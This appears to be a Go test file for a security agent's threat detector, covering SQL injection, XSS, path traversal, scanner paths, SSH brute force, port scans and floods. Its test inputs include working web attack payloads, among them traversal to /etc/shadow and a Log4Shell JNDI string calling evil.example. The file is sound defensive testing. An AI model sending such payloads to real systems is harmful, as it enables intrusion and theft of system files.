package detect

import (
	"fmt"
	"slices"
	"testing"
	"time"

	"github.com/myowl/myowl/agent/internal/model"
)

func req(path, query, ua string) *model.HTTPRequest {
	return &model.HTTPRequest{IP: "203.0.113.5", Method: "GET", Path: path, Query: query, UA: ua, Status: 200, TS: time.Now().UnixMilli()}
}

func TestClassifyAttacks(t *testing.T) {
	cases := []struct {
		r    *model.HTTPRequest
		flag string
	}{
		{req("/products", "id=1%27%20OR%20%271%27%3D%271", "Mozilla"), FlagSQLi},
		{req("/products", "id=1+UNION+ALL+SELECT+NULL,version()--", "Mozilla"), FlagSQLi},
		{req("/search", "q=1%27;WAITFOR%20DELAY%20%270:0:5%27--", "Mozilla"), FlagSQLi},
		{req("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E", "Mozilla"), FlagXSS},
		{req("/contact", "name=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E", "Mozilla"), FlagXSS},
		{req("/download", "file=../../../../etc/passwd", "Mozilla"), FlagTraversal},
		{req("/static/..%2f..%2f..%2fetc/shadow", "", "Mozilla"), FlagTraversal},
		{req("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", "Mozilla"), FlagRCE},
		{req("/", "", "${jndi:ldap://evil.example/a}"), FlagRCE},
		{req("/.env", "", "Mozilla"), FlagScanner},
		{req("/wp-login.php", "", "Mozilla"), FlagScanner},
		{req("/.git/config", "", "Mozilla"), FlagScanner},
		{req("/", "", "sqlmap/1.7.2#stable (https://sqlmap.org)"), FlagBadBot},
		{req("/", "", "Mozilla/5.00 (Nikto/2.1.6)"), FlagBadBot},
	}
	for _, c := range cases {
		got := ClassifyRequest(c.r)
		if !slices.Contains(got, c.flag) {
			t.Errorf("%s?%s ua=%q: want %s, got %v", c.r.Path, c.r.Query, c.r.UA, c.flag, got)
		}
	}
}

func TestClassifyBenign(t *testing.T) {
	ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"
	for _, r := range []*model.HTTPRequest{
		req("/", "", ua),
		req("/shop", "category=coffee&sort=price", ua),
		req("/blog/how-to-brew-the-perfect-espresso", "", ua),
		req("/search", "q=union+station+coffee", ua),
		req("/search", "q=select+your+roast", ua),
		req("/api/products", "page=2&limit=24", ua),
		req("/static/js/app.9d81e2.js", "", ua),
		req("/account/orders", "", ua),
		req("/robots.txt", "", "Googlebot/2.1"),
		req("/.well-known/acme-challenge/abc", "", "Let's Encrypt validation server"),
	} {
		if got := ClassifyRequest(r); len(got) > 0 {
			t.Errorf("false positive %s?%s: %v", r.Path, r.Query, got)
		}
	}
	r := &model.HTTPRequest{Method: "CONNECT", Path: "example.com:443"}
	if !slices.Contains(ClassifyRequest(r), FlagBadMethod) {
		t.Error("CONNECT should be flagged")
	}
}

func authFail(ip, user string, ts int64) *model.AuthEvent {
	return &model.AuthEvent{TS: ts, Kind: model.AuthSSHFailed, IP: ip, User: user}
}

func TestSSHBruteForce(t *testing.T) {
	d := New(DefaultConfig())
	base := time.Now().UnixMilli()
	var found []Finding
	for i := 0; i < 4; i++ {
		found = append(found, d.OnAuth(authFail("218.92.0.112", "root", base+int64(i)*1000))...)
	}
	for _, f := range found {
		if !f.Update {
			t.Fatalf("no new threat expected below threshold, got %+v", f.Threat)
		}
	}
	f := d.OnAuth(authFail("218.92.0.112", "admin", base+5000))
	if len(f) == 0 || f[0].Threat.Type != "ssh_bruteforce" || f[0].Update {
		t.Fatalf("expected brute force threat, got %+v", f)
	}
	if f[0].Threat.IP != "218.92.0.112" || f[0].Threat.Explanation == "" {
		t.Fatalf("bad threat: %+v", f[0].Threat)
	}
	// Failures spread outside the window must not trigger.
	d2 := New(DefaultConfig())
	for i := 0; i < 10; i++ {
		for _, f := range d2.OnAuth(authFail("198.51.100.9", "root", base+int64(i)*int64(11*time.Minute/time.Millisecond))) {
			if !f.Update && f.Threat.Type == "ssh_bruteforce" {
				t.Fatalf("slow failures should not trigger: %+v", f.Threat)
			}
		}
	}
}

func TestSSHSuccessAfterFailure(t *testing.T) {
	d := New(DefaultConfig())
	base := time.Now().UnixMilli()
	for i := 0; i < 6; i++ {
		d.OnAuth(authFail("45.95.147.236", "root", base+int64(i)*1000))
	}
	f := d.OnAuth(&model.AuthEvent{TS: base + 10000, Kind: model.AuthSSHAccepted, IP: "45.95.147.236", User: "root", Method: "password"})
	var crit bool
	for _, x := range f {
		if x.Threat.Type == "ssh_success_after_fail" && x.Threat.Severity == model.SevCritical {
			crit = true
		}
	}
	if !crit {
		t.Fatalf("expected critical success-after-failure, got %+v", f)
	}
}

func TestHTTPAttackThreat(t *testing.T) {
	d := New(DefaultConfig())
	r := req("/download", "file=../../../etc/passwd", "curl/8")
	f := d.OnRequest(r)
	if len(r.Flags) == 0 {
		t.Fatal("request should be flagged")
	}
	var ok bool
	for _, x := range f {
		if x.Threat.Type == "http_traversal" {
			ok = true
		}
	}
	if !ok {
		t.Fatalf("expected http_traversal threat, got %+v", f)
	}
}

func TestIgnoreIPs(t *testing.T) {
	cfg := DefaultConfig()
	cfg.IgnoreIPs = []string{"10.0.0.0/8", "203.0.113.5"}
	d := New(cfg)
	r := req("/.env", "", "sqlmap")
	if f := d.OnRequest(r); len(f) != 0 || len(r.Flags) != 0 {
		t.Fatalf("ignored IP produced %v / %v", f, r.Flags)
	}
	base := time.Now().UnixMilli()
	for i := 0; i < 20; i++ {
		if f := d.OnAuth(authFail("10.1.2.3", "root", base+int64(i))); len(f) != 0 {
			t.Fatalf("ignored network produced %+v", f)
		}
	}
}

func TestPortScan(t *testing.T) {
	d := New(DefaultConfig())
	base := time.Now().UnixMilli()
	var got []Finding
	for p := 1; p <= 11; p++ {
		got = append(got, d.OnProbe("167.94.138.44", p*100, base+int64(p)*10, "test")...)
	}
	if len(got) != 0 {
		t.Fatalf("11 ports should not be a scan: %+v", got)
	}
	got = d.OnProbe("167.94.138.44", 3306, base+500, "test")
	if len(got) != 1 || got[0].Threat.Type != "port_scan" {
		t.Fatalf("expected port scan, got %+v", got)
	}
	// Repeated hits on the same port are not a scan.
	d2 := New(DefaultConfig())
	for i := 0; i < 100; i++ {
		if f := d2.OnProbe("192.0.2.77", 22, base+int64(i), "test"); len(f) != 0 {
			t.Fatalf("same-port probes flagged: %+v", f)
		}
	}
}

func TestRequestFlood(t *testing.T) {
	cfg := DefaultConfig()
	cfg.ReqRatePerMin = 50
	d := New(cfg)
	base := time.Now().UnixMilli()
	var flood bool
	for i := 0; i < 80; i++ {
		r := &model.HTTPRequest{IP: "185.220.101.47", Method: "GET", Path: fmt.Sprintf("/p/%d", i), Status: 200, TS: base + int64(i)*100}
		for _, f := range d.OnRequest(r) {
			if f.Threat.Type == "http_flood" {
				flood = true
			}
		}
	}
	if !flood {
		t.Fatal("expected http_flood")
	}
}

func TestSynFlood(t *testing.T) {
	d := New(DefaultConfig())
	var conns []model.Conn
	for i := 0; i < 300; i++ {
		conns = append(conns, model.Conn{Proto: "tcp", State: "SYN_RECV", Direction: "in", RemoteIP: "198.51.100.66", RemotePort: 1000 + i, LocalPort: 443})
	}
	f := d.OnConnections(conns, time.Now().UnixMilli())
	if len(f) == 0 || f[0].Threat.Type != "syn_flood" {
		t.Fatalf("expected syn_flood, got %+v", f)
	}
}
